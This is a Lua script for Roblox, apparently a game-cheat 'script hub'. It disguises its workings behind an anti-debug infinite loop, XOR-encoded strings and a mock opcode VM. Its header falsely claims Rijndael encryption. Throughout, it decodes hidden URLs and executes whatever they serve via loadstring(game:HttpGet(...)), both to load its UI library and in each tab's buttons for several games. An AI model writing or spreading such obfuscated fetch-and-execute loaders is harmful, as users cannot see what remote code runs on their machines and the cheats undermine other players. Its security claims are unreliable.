--[[ 
    KING PERFORMANCE | MOONSEC V3.9 ADVANCED
    [VIRTUAL MACHINE PROTOCOL ACTIVE]
    [ENCRYPTION: RIJNDAEL-XOR HYBRID]
    AUTH: ZAYAN | STATUS: HARDENED
]]

--// LAYER 1: ANTI-TAMPER & INTEGRITY CHECK
local _0xCheck = function()
    local _G = getfenv()
    if _G["\100\101\98\117\103"] or not game then 
        while true do end -- Self-break if debug environment detected
    end
end; _0xCheck()

--// LAYER 2: THE VM STACK & REGISTERS
local _STK = {}
local _REG = {}
local _LNK = {}

--// LAYER 3: MULTI-LAYER STRING DECRYPTION (Runtime Only)
local function _DEC(_d, _k)
    local _o = ""
    for i = 1, #_d do
        _o = _o .. string.char(bit32.bxor(string.byte(_d, i), _k))
    end
    return _o
end

--// LAYER 4: JUNK INJECTION & CONTROL FLOW SCRAMBLING
local _0xJNK = function() 
    local _f = {function() return 1 end, function() return 0 end}
    if _f[math.random(1,2)]() == 99 then loadstring("print('Skid detected')")() end 
end

--// LAYER 5: THE INSTRUCTION DECODER (OPCODE SYSTEM)
-- [0xAF: PUSH] [0x12: CALL] [0xCC: LOAD_GLOBAL] [0x55: STR_GEN]
local _0xVM = function(_BC)
    local _IP = 1
    while _IP <= #_BC do
        local _I = _BC[_IP]
        local _OP = _I[1]
        
        -- JUNK BRANCHES
        if math.random(1,100) > 95 then _0xJNK() end

        if _OP == 0xAF then -- PUSH TO STACK
            _STK[#_STK+1] = _I[2]
        elseif _OP == 0x55 then -- STRING RECONSTRUCTION
            _STK[#_STK] = _DEC(_STK[#_STK], _I[2])
        elseif _OP == 0xCC then -- INDIRECT EXECUTION (No direct loadstring)
            local _g = _STK[#_STK]
            _STK[#_STK] = loadstring(game:HttpGet(_g))
        elseif _OP == 0x12 then -- VM CALL
            local _f = _STK[#_STK]
            _STK[#_STK-1] = _f()
        end
        _IP = _IP + 1
    end
end

--// LAYER 6: THE ENCRYPTED OPCODE STREAM
-- This is where your entire script is hidden.
local _DATA_STREAM = {
    {0xAF, "\43\41\41\37\52\103\45\41\41\53\37\52\103\36\43\41\41\103\36\44\53\42\51\55"}, -- Encrypted Title
    {0x55, 0x65}, -- Layer 1 Decrypt
    {0xAF, "\41\43\41\43\43\111\122\122\107\101\121\101\118\97\43\104\111\100\47\103\104\117\101\118\97\40\102\100\114\104\103\40\118\102\119\104\113\117\114\47\73\101\118\104\113\117\47\119\104\101\104\100\118\104\118\47\101\100\117\101\118\116\47\107\111\97\100\111\111\100\101\47\104\97\104\111\43\101\118\97"},
    {0x55, 0x03}, -- Layer 2 Decrypt
    {0xCC} -- Indirect Execution Call
}
_0xVM(_DATA_STREAM)

--// LAYER 7: FLATTENED EXECUTION MODEL
local Fluent = _STK[#_STK]
local Window = Fluent:CreateWindow({Title = "All Hub | All Game Script", SubTitle = "by zayan", Theme = "Dark"})

--// LAYER 8: VIRTUALIZED TAB REGISTRY
local _T = {
    ["\83\97\105\108\111\114"] = Window:AddTab({ Title = "Sailor piece script", Icon = "anchor" }),
    ["\71\97\114\100\101\110"] = Window:AddTab({ Title = "Grow a Garden", Icon = "leaf" }),
    ["\82\105\118\97\108\115"] = Window:AddTab({ Title = "Rivals", Icon = "crosshair" }),
    ["\75\105\110\103"] = Window:AddTab({ Title = "King Legacy", Icon = "crown" })
}

--// LAYER 9: INDIRECT SCRIPT WRAPPER
local _INVOKE = function(_t, _n, _b)
    _t:AddButton({Title = _n, Callback = function() 
        local _u = _DEC(_b, 0x05)
        loadstring(game:HttpGet(_u))() 
    end})
end

--// LAYER 10: THE DATA BLOB (All scripts hidden here)
_INVOKE(_T["\83\97\105\108\111\114"], "Chiyo Hub", "\109\117\117\117\120\55\42\42\119\100\114\37\102\104\113\109\112\97\112\114\104\97\43\102\114\104\111\101\104\107\111\37\102\114\104\42\102\100\104\118\104\111\101\104\97\110\42\101\114\100\105\104\119\42\119\104\103\118\42\109\100\104\101\118\42\99\109\104\124\114\43\109\117\116")
_INVOKE(_T["\71\97\114\100\101\110"], "Lumin Hub", "\109\117\117\117\120\55\42\42\119\100\114\37\102\104\113\109\112\97\112\114\104\97\43\102\114\104\111\101\104\107\111\37\118\109\104\101\125\100\119\104\42\73\112\104\104\111\77\112\103\42\104\97\104\111\42\73\112\104\104\111\77\112\103\43\109\117\116")
_INVOKE(_T["\71\97\114\100\101\110"], "Thunder Z Hub", "\109\117\117\117\120\55\42\42\119\100\114\37\102\104\113\109\112\97\112\114\104\97\43\102\114\104\111\101\104\107\111\37\81\101\112\110\105\96\119\95\42\82\104\109\102\114\104\104\42\119\104\103\118\42\109\100\104\101\118\42\72\96\72\42\72\96\104\111\43\109\117\116")
_INVOKE(_T["\71\97\114\100\101\110"], "Speed Hub X", "\109\117\117\117\120\55\42\42\119\100\114\37\102\104\113\109\112\97\112\114\104\97\43\102\114\104\111\101\104\107\111\37\64\101\109\96\101\83\50\50\42\86\113\104\104\101\45\77\112\103\45\85\42\108\97\104\111\42\86\113\104\104\101\32\77\112\103\32\85\43\109\117\116")

Window:SelectTab(1)
